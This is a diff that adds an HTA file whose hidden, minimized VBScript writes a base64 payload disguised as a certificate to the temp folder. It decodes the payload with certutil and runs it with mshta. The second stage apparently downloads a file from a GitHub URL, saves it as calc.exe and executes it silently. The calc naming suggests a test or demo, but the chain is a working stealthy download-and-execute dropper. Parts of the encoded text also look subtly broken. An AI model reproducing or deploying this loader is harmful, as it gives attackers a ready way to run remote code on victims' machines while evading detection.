@@ -1,0 +1,46 @@
+<html>
+<head>
+<hta:application id="htaTest"
+    applicationname="HTA"
+    border="thin"
+    borderstyle="normal"
+    caption="no"
+    showintaskbar="no"
+    windowstate="minimize">
+</hta:application>
+<script language="VBScript">
+    On Error Resume Next
+    Dim fso, shell, f, TempTxt, TempPath, base64
+
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+
+    TempTxt = shell.ExpandEnvironmentStrings("%TEMP%") & "\payload.txt"
+    TempPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\stage2.hta"
+
+    base64 = "-----BEGIN CERTIFICATE-----" & vbCrLf & _
+             "PGh0bWw+PGhlYWQ+PGh0YTphcHBsaWNhdGlvbiB3aW5kb3dzdGF0ZT0iaGlkZSIgc2hvd2ludGFza2Jhcj0ibm8iIGNhcHRpb249Im5vIj48L2h0YTphcHBsaWNhdGlvbj48L2hlYWQ+PHNjcmlwdCBsYW5ndWFnZT0iVkJTY3JpcHQiPk9uIEVycm9yIFJlc3VtZSBuZXh0CkRp
+bSBmc28sIHNoZWxsLCBodHRwLCBleGVQYXRoLCBkbGZpbGUKU2V0IGZzbyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQpTZXQgc2hlbGwgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQpTZXQgaHR0cCA9IENyZWF0ZU9iamVjdCgiTVNY
+TUwuWE1MSFRUUCINClJlbU5hbWUgPSBzaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVURU1QJSIpICYgIlxjYWxjLmV4ZSIKRGxuYW1lID0gc2hlbGwuRXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzKCIlVEVNUCUiKSAmICJcY2FsYy50eHQiCkhURFBVUkwgPSAiaHR0cHM6Ly
+9naXRodWIuY29tL21pbG9zaWxvL3Rlc3Qtc2NyaXB0cy9yYXcvbWFpbi9jYWxjLnR4dCIKaHR0cC5PcGVuICJHRVQiLCBIVE RQVVJMLCBGYWxzZQpodHRwLlNlbmQKaWYgaHR0cC5TdGF0dXMgPT0gMjAwIFRoZW4KICAgIFNldCBzdHJlYW0gPSBDcmVhdGVPYmplY3QoIkFET0JCLl
+N0cmVhbSIpCiAgICBzdHJlYW0uVHlwZSA9IDEKICAgIHN0cmVhbS5PcGVuCiAgICBzdHJlYW0uV3JpdGUgaHR0cC5yZXNwb25zZUJvZHkKICAgIHN0cmVhbS5TYXZlVG9GaWxlIERsbmFtZSwgMgogICAgc3RyZWFtLkNsb3NlCiAgICBGaWxlUmVuYW1lIERsbmFtZSwgUmVtTmFtZQogI
+CBzaGVsbC5SdW4gIlxjbGNhbGMuZXhlIiwgMCwgRmFsc2UKRW5kIElmCkVuZCBJZg==" & vbCrLf & _
+             "-----END CERTIFICATE-----"
+
+    ' Step 1: Write base64 to temp file
+    Set f = fso.CreateTextFile(TempTxt, True)
+    f.Write base64
+    f.Close
+
+    ' Step 2: Decode to HTA using certutil
+    shell.Run "cmd /c certutil -decode """ & TempTxt & """ """ & TempPath & """", 0, True
+
+    ' Step 3: Execute the decoded HTA
+    shell.Run "mshta.exe """ & TempPath & """", 0, False
+
+    ' Step 4: Cleanup
+    fso.DeleteFile TempTxt
+</script>
+</head>
+<body></body>
+</html>
